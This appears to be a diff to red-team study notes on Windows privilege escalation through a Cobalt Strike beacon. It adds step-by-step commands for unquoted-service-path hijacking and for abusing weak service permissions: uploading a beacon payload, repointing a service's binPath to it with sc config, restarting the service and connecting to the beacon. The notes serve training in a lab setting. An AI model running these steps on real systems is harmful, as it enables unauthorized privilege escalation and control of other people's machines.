@@ -165,6 +165,10 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 7. next type `link locahost`.
 8. **link** command is for **SMB** and **connect** is for **TCP**. 
 
+#### what is windows service ? 
+1. A Windows "service" is a special type of application that is usually started automatically when the computer boots. e.g. Defender, Skype, Firewall etc.
+2. We can view the services by typing **services.msc** or in **CMD** typing `sc query` or in **PowerShell** its `Get-Service | fl`.
+
 #### method -> unquoted services path
 1. `beacon> run wmic service get name, pathname`.
 2. `powershell Get-Acl -Path "C:\Program Files\Vuln Services" | fl`.
@@ -174,8 +178,24 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 6. `run sc start Vuln-Service-1`
 7. `connect localhost <what ever the port number you used when generating the payload`
 8. `connect localhost 4444`
-#### method -> weak service permission
+9. Theme: **if there aren't proper quotes for white space applications, we can hijack it** 
 
+#### method -> weak service permission
+1. First check what permissions are assosicated with the service
+2. Command A: `powershell-import C:\Tools\Get-ServiceAcl.ps1`
+3. Command B: `powershell Get-ServiceAcl -Name Vuln-Service-2 | select -expandproperty `
+4. Lets assume we get **ServiceRights     : ChangeConfig, Start, Stop** response
+5. So, we can try changing its **exe** path from **C:\Program Files\Vuln Services\Service 2.exe** to our malicious location e.g. **C:\temp\hack.exe**
+6. Create and upload **TCP beacon exe** to the remote system -> `upload C:\Payloads\beacon-tcp-svc.exe`
+7. Next -> `mv C:\Payloads\beacon-tcp-svc.exe C:\temp\fake-service.exe`
+8. Check the orignal permissions of vulnservice2 -> `run sc qc Vuln-Service-2`
+9. Next -> `run sc config Vuln-Service-2 binPath= C:\Temp\fake-service.exe`
+10. Next -> `run sc qc Vuln-Service-2`
+11. Next -> `run sc query Vuln-Service-2`
+12. Next -> `run sc stop Vuln-Service-2`
+13. Next -> `run sc start Vuln-Service-2`
+14. Next -> `connect localhost 4444`
+15. Theme: **if there are weak permissions against an application, we can modify its .exe path and get our malicious .exe in C:\temp get executed**
 #### method -> weak service binary permission
 
 #### method -> always install elevated
